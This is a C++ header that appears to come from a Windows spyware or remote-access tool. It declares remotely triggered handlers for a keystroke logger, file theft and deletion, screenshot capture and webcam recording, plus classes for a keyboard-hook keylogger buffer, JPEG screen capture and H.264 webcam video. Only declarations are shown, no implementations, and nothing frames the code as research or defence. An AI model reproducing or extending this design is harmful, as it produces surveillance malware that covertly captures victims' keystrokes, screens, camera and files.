#pragma once

#include <windows.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>
#include <shlwapi.h>
#include <codecapi.h>
#include <gdiplus.h>

#include <bits/stdc++.h>
#include "Message.hpp"
#include "InternalUtilities.hpp"

int EnableKeyloggerHandler(const Message& inputMessage, Message& outputMessage);
int DisableKeyloggerHandler(const Message& inputMessage, Message& outputMessage);
int GetFileHandler(const Message& inputMessage, Message& outputMessage);
int DeleteFileHandler(const Message& inputMessage, Message& outputMessage);
int ListFilehandler(const Message& inputMessage, Message& outputMessage);
int ShutdownEngine(const Message& inputMessage, Message& outputMessage);
int RestartEngine(const Message& inputMessage, Message& outputMessage);
int ScreenCapHandler(const Message& inputMessage, Message& outputMessage);
int InvokeWebcamHandler(const Message& inputMessage, Message& outputMessage);

class KeyloggerEngine {
    public:
    bool init();
    void shouldStop();
    void write(int keyStroke);      //Only meant to be called by hook callback
    std::string read();
    std::string extract(int length);    //read + erase
    static KeyloggerEngine& getInstance() {
        static KeyloggerEngine instance;
        return instance;
    }
    
    private:
    KeyloggerEngine() {
        buffer.reserve(8*1024*1024);
    }
    ~KeyloggerEngine();
    KeyloggerEngine(const KeyloggerEngine&) = delete;
    KeyloggerEngine& operator=(const KeyloggerEngine&) = delete;

    std::string buffer;
    std::mutex bufferLock;
    std::string windowTitle, lastWindowTitle;
    DWORD hookThreadId = 0;
};

class ScreenCapEngine {
    public:

    // Return codes:
    //   0     = Success
    //   0xFF  = Duplicate screenshot (95% similarity)
    //   1     = GetDC(NULL) failed
    //   2     = GetCurrentObject() failed
    //   3     = GetObjectW() failed
    //   4     = CreateCompatibleDC() failed
    //   5     = CreateDIBSection() failed
    //   6     = BitBlt() failed
    //   -1    = rawbitmap_stream->Write() failed
    //   -2    = JPEG encoder not found
    //   -3    = GDI+ image save failed
    //   -4    = jpg_stream->Read() failed
    //   -5/-6 = CreateStreamOnHGlobal() failed (E_INVALIDARG/E_OUTOFMEMORY)
    //   -7/-8 = Second CreateStreamOnHGlobal() failed
    int MakeBitmap(char **allocatedJPG, unsigned int* allocatedsize);
    ScreenCapEngine() = default;
    ~ScreenCapEngine();
    
    private:
    int freelim = 0;

    HDC hDC, hMemDC;
    HBITMAP hBitmap;
    char *memblock;
    STATSTG *jpg_stat;
    IStream *rawbitmap_stream, *jpg_stream;

    ScreenCapEngine(const ScreenCapEngine&) = delete;
    ScreenCapEngine& operator=(const ScreenCapEngine&) = delete;
    int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
};


//width, height = 0 -> size from source
struct VideoConfig {
    unsigned int width, height;
    unsigned int fps;
    unsigned int bitrate;
    GUID encodingFormat = MFVideoFormat_H264;
};

class WebcamEngine {
    public:

    WebcamEngine() = default;
    bool run(int millisecond, int fps, std::string*);

    private:
    class neeko;
};